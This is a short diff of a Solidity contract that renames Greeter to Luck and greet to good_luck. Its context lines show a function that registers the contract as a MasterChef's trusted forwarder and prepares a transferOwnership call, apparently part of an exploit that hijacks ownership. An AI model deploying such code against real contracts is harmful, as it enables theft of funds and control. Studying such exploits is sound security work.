@@ -10,7 +10,7 @@ interface IMasterChef {
     function owner() external pure returns(address);
 }
 
-contract Greeter {
+contract Luck {
 
     address private owner;
 
@@ -29,7 +29,7 @@ contract Greeter {
 
     event CALLDATA(bytes);
 
-    function greet() external onlyOwner {
+    function good_luck() external onlyOwner {
         IMasterChef(MASTER_CHEF).setTrustedForwarder(address(this));
         
         emit SELECTOR(bytes4(keccak256("transferOwnership(address)")));
